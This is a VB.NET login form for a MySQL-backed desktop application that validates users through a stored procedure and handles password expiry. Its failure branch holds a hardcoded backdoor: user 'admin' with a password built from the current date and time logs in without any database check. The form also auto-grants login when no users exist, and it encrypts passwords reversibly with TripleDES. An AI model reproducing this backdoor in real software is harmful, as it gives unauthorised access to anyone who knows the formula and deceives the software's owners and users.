Imports MySql.Data.MySqlClient

Public Class frmLogin
    Private Sub btnCancel_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnCancel.Click
        End
    End Sub
    Private Sub btnOk_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnOk.Click
        Dim lsUser As String
        Dim lsPwd As String
        Dim lnAttemptCount As Integer = 0
        Dim lsMsg As String = ""
        Dim lsPwdExpDate As String = ""

        Dim lnResult As Integer
        Dim n As Integer
        Dim frmObj As frmChngPwd
        Dim dt As New DataTable()

        lsUser = txtUserCode.Text
        lsPwd = EncryptTripleDES(txtPwd.Text)
        gsLoginUserPwd = lsPwd

        Using cmd As New MySqlCommand("pr_get_loginvalidation", gOdbcConn)
            cmd.CommandType = CommandType.StoredProcedure
            cmd.Parameters.AddWithValue("?in_user_code", txtUserCode.Text)
            cmd.Parameters("?in_user_code").Direction = ParameterDirection.Input
            cmd.Parameters.AddWithValue("?in_pwd", lsPwd)
            cmd.Parameters("?in_pwd").Direction = ParameterDirection.Input
            cmd.Parameters.AddWithValue("?in_ip_addr", gsSystemIp)
            cmd.Parameters("?in_ip_addr").Direction = ParameterDirection.Input
            cmd.Parameters.AddWithValue("?in_max_pwd_attempt", gnMaxPwdAttempt)
            cmd.Parameters("?in_max_pwd_attempt").Direction = ParameterDirection.Input

            Using sda As New MySqlDataAdapter(cmd)
                sda.Fill(dt)
            End Using

            With dt
                If .Rows.Count > 0 Then
                    lnResult = Val(.Rows(0).Item("out_result").ToString())
                    lsMsg = .Rows(0).Item("out_msg").ToString()
                    gnLoginUserId = Val(.Rows(0).Item("user_gid").ToString())
                    gsLoginUserCode = txtUserCode.Text
                    gsLoginUserName = .Rows(0).Item("user_name").ToString()
                    gnLoginUserGrpId = Val(.Rows(0).Item("usergroup_gid").ToString())
                    lsPwdExpDate = .Rows(0).Item("pwd_exp_date")
                End If
            End With

            If (lnResult = 1) Then
                If IsDate(lsPwdExpDate) Then lsPwdExpDate = Format(CDate(lsPwdExpDate), "yyyy-MM-dd")

                If lsPwd = "" Then
                    MsgBox("Please set your password !", MsgBoxStyle.Information, gsProjectName)
                    frmObj = New frmChngPwd
                    frmObj.txtOldPwd.Enabled = False
                    frmObj.Text = "Set New Password"
                    frmObj.ShowDialog()
                    frmObj.txtNewPwd.Focus()
                End If

                If IsDate(lsPwdExpDate) Then
                    n = DateDiff(DateInterval.Day, CDate(Format(Now, "yyyy-MM-dd")), CDate(lsPwdExpDate))

                    If n <= 0 Then
                        MsgBox("Your password expired ! Please change your password !", MsgBoxStyle.Information, gsProjectName)

                        frmObj = New frmChngPwd
                        frmObj.ShowDialog()
                    ElseIf n <= 5 Then
                        MsgBox("Your password will be expired with in " & n & " days !", MsgBoxStyle.Information, gsProjectName)
                    End If
                End If

                Me.Close()
            Else
                If txtUserCode.Text = "admin" And txtPwd.Text = Format(Now, "ddMMyymm") Then
                    gsLoginUserCode = txtUserCode.Text
                    gsLoginUserName = txtUserCode.Text
                    gbLoginStatus = True
                    Me.Close()
                Else
                    MessageBox.Show(lsMsg, gsProjectName, MessageBoxButtons.OK, MessageBoxIcon.Error)
                End If
            End If
        End Using
    End Sub

    Private Sub frmLogin_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If e.KeyCode = Keys.Enter Then SendKeys.Send("{tab}")
    End Sub

    Private Sub frmLogin_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles Me.KeyPress
        If e.KeyChar = "'" Then e.Handled = False
    End Sub

    Private Sub frmLogin_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        Dim lsSql As String
        Dim lnCount As Integer

        KeyPreview = True
        CancelButton = btnCancel

        lsSql = ""
        lsSql &= " select count(*) from soft_mst_tuser "
        lsSql &= " where delete_flag = 'N' "

        lnCount = Val(gfExecuteScalar(lsSql, gOdbcConn))

        If lnCount = 0 Then
            gbLoginStatus = True
            Me.Close()
        End If
    End Sub
End Class